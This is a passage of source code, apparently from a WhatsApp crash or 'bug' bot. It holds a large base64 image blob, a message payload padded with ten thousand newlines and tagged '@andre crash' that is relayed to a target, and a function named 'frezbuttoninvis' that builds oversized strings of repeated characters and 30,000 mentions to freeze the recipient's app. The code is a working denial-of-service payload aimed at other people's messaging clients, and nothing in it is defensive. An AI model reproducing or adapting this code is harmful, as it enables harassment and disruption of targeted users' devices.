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",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "@andre crash"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {   
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

    await sock.relayMessage(target, msg.message, {
  participant: { jid: target},
    messageId: msg.key.id
  });

  return msg.key; // balikin key biar bisa dihapus
}
async function frezbuttoninvis(target) {
    const spamMessage = "@1".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    
    
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "'ryzen is here 🥵",
                    previewType: "Hola 🤣",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
